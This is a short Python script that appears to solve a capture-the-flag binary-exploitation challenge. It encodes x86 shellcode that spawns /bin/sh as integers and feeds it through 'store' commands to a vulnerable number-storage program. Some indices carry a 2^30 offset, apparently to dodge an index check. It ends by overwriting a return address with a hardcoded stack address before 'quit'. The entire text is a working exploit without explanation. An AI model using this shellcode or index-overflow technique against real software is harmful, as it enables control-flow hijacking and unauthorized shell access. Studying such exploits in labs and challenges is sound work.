shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

stores = []

endianness = "little"

i = 0

while i < len(shellcode) + 1:
    stores.append(int.from_bytes(shellcode[i:i+4], endianness))
    i += 4

start = 0

for store in stores:

    index = start

    if start % 3 == 0:
        index += 1073741824

    print("store\n{0}\n{1}".format(store, index))

    start += 1


endianness_addr = "little"

f = int.from_bytes(b"\x48\xd5\xff\xff", endianness_addr)

print("store\n{0}\n{1}\nquit".format(f, 1073741938))
